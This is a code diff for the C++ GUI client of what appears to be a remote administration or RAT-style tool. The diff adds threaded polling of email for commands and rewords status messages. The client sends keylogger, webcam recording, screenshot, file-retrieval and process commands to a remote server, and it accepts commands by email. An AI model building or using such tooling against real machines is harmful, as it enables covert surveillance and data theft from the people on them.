@@ -12,7 +12,13 @@ RemoteAdminUI::RemoteAdminUI() {
 }
 
 RemoteAdminUI::~RemoteAdminUI() {
-    // Cleanup if needed
+    StopEmailCheckThread();
+    
+    // Close socket
+    if (mySock != INVALID_SOCKET) {
+        closesocket(mySock);
+    }
+    WSACleanup();
 }
 
 void RemoteAdminUI::AddResult(const std::string& message, ImVec4 color) {
@@ -30,8 +36,10 @@ void RemoteAdminUI::HandleConnect() {
         connectionStatus = "Disconnected";
         activeCommand = CommandState::IDLE;
         AddResult("Disconnected from server", Colors::WARNING);
-        closesocket(mySock);
-        WSACleanup();
+        if (mySock != INVALID_SOCKET) {
+            closesocket(mySock);
+        }
+        //WSACleanup();
     } else {
         // Connect
         connectionStatus = "Connecting...";
@@ -42,7 +50,9 @@ void RemoteAdminUI::HandleConnect() {
             isConnected = false;
             return;
         }
-        closesocket(mySock);
+        if (mySock != INVALID_SOCKET) {
+            closesocket(mySock);
+        }
         // Simulate connection for demo
         isConnected = true;
         connectionStatus = "Connected";
@@ -64,7 +74,7 @@ void RemoteAdminUI::ExecuteCommand(CommandState command) {
             AddResult("Executing: List Processes", Colors::INFO);
             send_manual_command("list_process", serverIP, std::stoi(serverPort));
             SetResultText("received_files/processes_with_pid.txt");
-            SimulateCommand("Process Listed:");
+            SimulateCommand("Process Listed saved to: received_files/processes_with_pid.txt");
             break;
             
         case CommandState::START_PROCESS:
@@ -83,7 +93,7 @@ void RemoteAdminUI::ExecuteCommand(CommandState command) {
             AddResult("Executing: List Applications", Colors::INFO);
             send_manual_command("list_program", serverIP, std::stoi(serverPort));
             SetResultText("received_files/running_programs.txt");
-            SimulateCommand("List Applications");
+            SimulateCommand("List Applications saved to: received_files/running_programs.txt");
             break;
             
         case CommandState::START_APP:
@@ -113,34 +123,34 @@ void RemoteAdminUI::ExecuteCommand(CommandState command) {
         case CommandState::KEYLOGGER:
             AddResult("Executing: Keylogger for " + std::to_string(keyloggerDuration) + " seconds", Colors::INFO);
             send_manual_command("keylogger " + std::to_string(keyloggerDuration), serverIP, std::stoi(serverPort));
-            SimulateCommand("Keylogger started");
+            SimulateCommand("Keylogger result have been saved.");
             SetResultText("received_files/keylog.txt");
             break;
             
         case CommandState::START_WEBCAM: {
             AddResult("Executing: Webcam Record", Colors::INFO);
             send_manual_command("start_recording", serverIP, std::stoi(serverPort));
-            SimulateCommand("Record started ...");
+            SimulateCommand("Record started, press stop webcam to receive record.");
             break;
         }
         case CommandState::STOP_WEBCAM: {
             AddResult("Executing: Webcam Record", Colors::INFO);
             send_manual_command("stop_recording", serverIP, std::stoi(serverPort));
             LoadMedia("received_files/recording.avi");
-            SimulateCommand("Webcam capture completed\nImage saved to: webcam_capture.jpg");
+            SimulateCommand("Webcam capture completed\n Record saved to: webcam_capture.jpg");
             break;
         }
         case CommandState::GET_FILE:
             AddResult("Executing: Get File - " + std::string(filePath), Colors::INFO);
             send_manual_command("send_file " + string(filePath), serverIP, std::stoi(serverPort));
-            SimulateCommand("File downloaded: " + std::string(filePath) + " to received_files/");
+            SimulateCommand("File " + std::string(filePath) + " downloaded and save to: received_files/");
             break;
             
         case CommandState::TAKE_SCREENSHOT:
             AddResult("Executing: Take ScreenShot", Colors::INFO);
             send_manual_command("get_screenshot", serverIP, std::stoi(serverPort));
             LoadMedia("received_files/screenshot.png");
-            SimulateCommand("Directory listing:\nfile1.txt\nfile2.jpg\nsubfolder/");
+            SimulateCommand("Screenshot has been captured.\n Image saved to: webcam_capture.jpg");
             break;
     }
 }
@@ -151,45 +161,52 @@ void RemoteAdminUI::SimulateCommand(const std::string& result, ImVec4 color) {
     activeCommand = CommandState::IDLE;
 }
 
-void RemoteAdminUI::CheckEmailAutomatically() {
-    if (currentMode == UIMode::EMAIL && isConnected) {
-        auto now = std::chrono::steady_clock::now();
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastCheckTime).count() >= 5) {
-            lastCheckTime = now;
-            
-            // Update timestamp
-            auto time_now = std::chrono::system_clock::now();
-            auto time_t = std::chrono::system_clock::to_time_t(time_now);
-            auto tm = *std::localtime(&time_t);
-            char buffer[32];
-            strftime(buffer, sizeof(buffer), "%H:%M:%S", &tm);
-            lastEmailCheck = buffer;
-            
-            emailStatus = "Checking...";
-            
-            auto commands = fetch_email_commands();
-            for (auto &[cmd, senderEmail] : commands) {
-                mySock = connect_to_server(serverIP, std::stoi(serverPort));
-                if (mySock == INVALID_SOCKET) {
-                    AddResult("Could not connect to server", Colors::FAULT);
-                    std::cerr << "[Client] Could not connect to server\n";
-                    isConnected = false;
-                    return;
-                }
-                AddResult("[Email] Processing command from " + senderEmail + ": " + cmd, Colors::INFO);
-                process_command(cmd, senderEmail, mySock);
-                closesocket(mySock);
-            }
-            
+void RemoteAdminUI::StartEmailCheckThread() {
+    stopEmailThread = false;
+    emailThread = std::thread([this]() {
+        while (!stopEmailThread) {
+            if (currentMode == UIMode::EMAIL && isConnected) {
+                // Same 5 second timer logic
+                auto now = std::chrono::steady_clock::now();
+                if (std::chrono::duration_cast<std::chrono::seconds>(now - lastCheckTime).count() >= 5) {
+                    lastCheckTime = now;
 
-            static bool checking = false;
-            if (!checking) {
-                checking = true;
-                emailStatus = "No new commands";
-                checking = false;
+                    auto time_now = std::chrono::system_clock::now();
+                    auto time_t = std::chrono::system_clock::to_time_t(time_now);
+                    auto tm = *std::localtime(&time_t);
+                    char buffer[32];
+                    strftime(buffer, sizeof(buffer), "%H:%M:%S", &tm);
+                    lastEmailCheck = buffer;
+
+                    emailStatus = "Checking...";
+
+                    auto commands = fetch_email_commands();
+                    for (auto &[cmd, senderEmail] : commands) {
+                        mySock = connect_to_server(serverIP, std::stoi(serverPort));
+                        if (mySock == INVALID_SOCKET) {
+                            AddResult("Could not connect to server", Colors::FAULT);
+                            isConnected = false;
+                            break;
+                        }
+                        AddResult("[Email] Processing command from " + senderEmail + ": " + cmd, Colors::INFO);
+                        process_command(cmd, senderEmail, mySock);
+                        closesocket(mySock);
+                    }
+
+                    if (commands.empty()) {
+                        emailStatus = "No new commands";
+                    }
+                }
             }
+            std::this_thread::sleep_for(std::chrono::milliseconds(200)); // reduce CPU usage
         }
-    }
+    });
+}
+
+void RemoteAdminUI::StopEmailCheckThread() {
+    stopEmailThread = true;
+    if (emailThread.joinable())
+        emailThread.join();
 }
 
 void RemoteAdminUI::SetResultImage(GLuint texture, int width, int height, const std::string& filename) {
@@ -235,4 +252,20 @@ void RemoteAdminUI::ClearResult() {
     currentResultText = "";
 }
 
+void RemoteAdminUI::SetMode(UIMode mode) {
+    if (mode == currentMode) return;
 
+    // Leaving EMAIL? Stop the thread first.
+    if (currentMode == UIMode::EMAIL) {
+        StopEmailCheckThread();
+        emailStatus = "Stopped";
+    }
+
+    currentMode = mode;
+
+    // Entering EMAIL and connected? Start the thread.
+    if (currentMode == UIMode::EMAIL && isConnected) {
+        StartEmailCheckThread();
+        emailStatus = "Running";
+    }
+}
